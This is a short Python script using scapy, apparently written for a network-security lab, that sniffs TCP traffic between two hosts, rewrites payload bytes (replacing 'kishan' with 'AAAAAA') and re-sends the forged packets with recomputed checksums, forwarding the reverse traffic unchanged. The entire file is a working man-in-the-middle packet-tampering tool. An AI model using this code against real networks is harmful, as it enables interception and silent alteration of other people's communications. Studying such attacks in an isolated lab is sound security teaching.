from scapy.all import *
import re

# Update these variables with the correct IP and MAC addresses for your lab
VM_A_IP = '10.9.0.5'  # IP address of Host A
VM_B_IP = '10.9.0.6'  # IP address of Host B
VM_A_MAC = '02:42:0a:09:00:05'  # MAC address of Host A
VM_B_MAC = '02:42:0a:09:00:06'  # MAC address of Host B

def spoof_pkt(pkt):
    if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
        payload = pkt[TCP].payload.load
        print("* %s, length: %d" % (payload.decode('utf-8'), len(payload)))

        # Replace 'Kishan' with 'AAAAAA' in the payload
        new_payload = payload.replace(b'kishan', b'AAAAAA')

        print("* Modified payload: %s, length: %d" % (new_payload.decode('utf-8'), len(new_payload)))

        # Create a new packet with the modified payload
        new_pkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) / \
                  TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=pkt[TCP].flags) / \
                  new_payload

        # Remove checksums
        del new_pkt[IP].chksum
        del new_pkt[TCP].chksum

        send(new_pkt, verbose=False)
    elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
        print("Packet received from B to A; forwarding without modification.")
        send(pkt, verbose=False)

# Start sniffing for TCP packets
sniff(filter='tcp', prn=spoof_pkt)